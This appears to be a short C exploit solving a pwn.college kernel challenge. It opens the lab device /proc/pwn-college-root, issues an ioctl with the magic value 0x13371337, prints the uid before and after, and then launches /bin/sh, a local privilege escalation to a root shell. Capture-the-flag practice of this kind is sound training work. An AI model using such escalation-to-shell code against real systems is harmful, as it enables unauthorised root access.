#include <assert.h>

int main(void){

  int fd = open("/proc/pwn-college-root", 0);
  assert(fd > 0);
  printf("BEFPRE uid %d\n", getuid());
  ioctl(fd, 0x7001, 0x13371337);
  printf("AFTER uid %d\n", getuid());
  execl("/bin/sh", "/bin/sh", 0);

  return 0;
}
